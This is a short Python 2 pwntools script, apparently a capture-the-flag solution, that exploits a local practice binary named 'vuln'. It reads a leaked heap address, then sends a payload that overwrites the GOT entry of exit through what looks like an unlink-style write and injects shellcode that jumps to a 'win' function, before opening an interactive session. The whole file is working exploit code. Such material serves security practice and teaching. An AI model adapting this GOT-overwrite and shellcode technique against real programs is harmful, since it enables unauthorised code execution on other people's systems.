#!/usr/bin/env python2

from pwn import *

elf = ELF('./vuln')
p = process('./vuln')

context.terminal = ['tmux', 'new-window']
#gdb.attach(p, 'b *main+289')

exit_got = elf.got['exit']
win = elf.symbols['win']

log.info('exit: ' + hex(exit_got))
log.info('win: ' + hex(win))

first_addr = int(p.recv().split('\n')[1].strip('\n'))

log.info('first: ' + hex(first_addr))

p.sendline('')

print p.recv()

p.sendline(p32(exit_got - 0xc) + p32(first_addr + 0x8) + "\xB8\x56\x89\x04\x08\xFF\xD0" + '\x90'*12)

p.interactive()
